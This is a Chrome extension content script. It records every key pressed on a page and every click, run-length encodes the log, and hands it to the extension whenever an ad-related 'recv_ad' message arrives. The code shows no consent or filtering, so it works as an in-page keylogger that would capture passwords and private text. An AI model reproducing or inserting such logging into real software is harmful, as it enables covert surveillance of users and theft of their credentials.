var logger = "", logger_start  = false;
var run_length_coding = ( logger ) => {
    let result = "", last_char = "", last_num = 1;
    for (i = 0; i < logger.length; i++) { 
        let char = logger[i];
        if ( last_char === char ) {
            last_num += 1; continue;
        }
        if ( last_num != 1 ) {
            result += last_num.toString(); last_num = 1;
        }
        result += char; last_char = char;
    }
    return ( last_num != 1 )? (result + last_num.toString()) : result;
};

keyboardJS.bind('', (e) => { logger += e.key ; }, null );
document.addEventListener('click', (e) => { logger += 'X'; }, false);

chrome.runtime.sendMessage({ action: "get_tabId" });
chrome.extension.onMessage.addListener( (msg, sender, sendResponse) => {
    if ( msg.action !== 'recv_ad' ) { return; }
    if ( logger_start ) {
        let encode_logger = run_length_coding(logger);
        sendResponse({
            res:"success",
            logger: encode_logger,
            len : encode_logger.length,
            time: msg.time
        });
    } else {
        logger_start = true;
        sendResponse( { res: "fail" } );
    }
    logger = "";
});
